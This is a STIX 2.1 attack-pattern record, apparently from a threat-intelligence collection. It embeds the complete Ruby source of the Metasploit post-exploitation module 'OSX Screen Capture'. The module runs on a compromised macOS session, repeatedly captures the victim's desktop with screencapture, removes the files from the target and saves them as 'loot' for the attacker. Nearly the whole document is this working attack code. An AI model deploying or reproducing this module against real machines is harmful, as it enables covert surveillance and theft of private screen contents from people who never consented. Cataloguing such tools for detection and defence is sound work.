{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b88d8ee2-56f4-4db5-a1ba-023e2c4aeab8",
    "created": "2024-08-14T16:33:00.706446Z",
    "modified": "2024-08-14T16:33:00.70645Z",
    "name": "OSX Screen Capture",
    "description": " This module takes screenshots of target desktop and automatically downloads them.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/capture/screen.rb",
            "external_id": "screen.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Screen Capture',\n        'Description' => %q{\n          This module takes screenshots of target desktop and automatically downloads them.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Peter Toth <globetother[at]gmail.com>' # ported windows version to osx\n        ],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n\n    register_options(\n      [\n        OptEnum.new('FILETYPE',\n                    [true, 'File format to use when saving a snapshot', 'png', %w[png gif]]),\n        OptInt.new('DELAY', [true, 'Interval between screenshots in seconds. 0 for no delay', 10]),\n        OptInt.new('COUNT', [true, 'Number of screenshots to collect.', 1]),\n        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/tmp/<random>']),\n        OptString.new('EXE_PATH', [true, 'Path to remote screencapture executable', '/usr/sbin/screencapture'])\n      ]\n    )\n  end\n\n  def run\n    file_type = datastore['FILETYPE'].shellescape\n    exe_path = datastore['EXE_PATH'].shellescape\n    tmp_path = datastore['TMP_PATH'].gsub('<random>', Rex::Text.rand_text_alpha(8)).shellescape\n    if datastore['COUNT'] < 1\n      count = 1\n    else\n      count = datastore['COUNT']\n    end\n    if datastore['DELAY'] < 0\n      delay = 0\n    else\n      delay = datastore['DELAY']\n    end\n\n    if !file?(exe_path)\n      print_error('Aborting, screencapture binary not found.')\n      return\n    end\n\n    print_status \"Capturing #{count} screenshots with a delay of #{delay} seconds\"\n    # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits\n    leading_zeros = Math.log10(count).round\n    file_locations = []\n\n    count.times do |num|\n      Rex.sleep(delay) unless num <= 0\n\n      begin\n        # This is an OSX module, so mkdir -p should be fine\n        cmd_exec(\"mkdir -p #{tmp_path}\")\n        filename = Rex::Text.rand_text_alpha(7)\n        file = \"#{tmp_path}/#{filename}\"\n        cmd_exec(\"#{exe_path} -x -C -t #{file_type} #{file}\")\n        data = read_file(file)\n        file_rm(file)\n      rescue ::Rex::Post::Meterpreter::RequestError => e\n        print_error('Error taking the screenshot')\n        vprint_error(\"#{e.class} #{e} #{e.backtrace}\")\n        return\n      end\n\n      unless data\n        print_error(\"No data for screenshot #{num}\")\n        next\n      end\n\n      begin\n        # let's loot it using non-clobbering filename, even tho this is the source filename, not dest\n        fn = \"screenshot.%0#{leading_zeros}d.#{file_type}\" % num\n        location = store_loot('screen_capture.screenshot', \"image/#{file_type}\", session, data, fn, 'Screenshot')\n        vprint_good(\"Screenshot #{num} saved on #{location}\")\n        file_locations << location\n      rescue ::IOError, ::Errno::ENOENT => e\n        print_error('Error storing screenshot')\n        vprint_error(\"#{e.class} #{e} #{e.backtrace}\")\n        return\n      end\n    end\n\n    print_status('Screen Capturing Complete')\n    if file_locations && !file_locations.empty?\n      print_status('Use \"loot -t screen_capture.screenshot\" to see file locations of your newly acquired loot')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}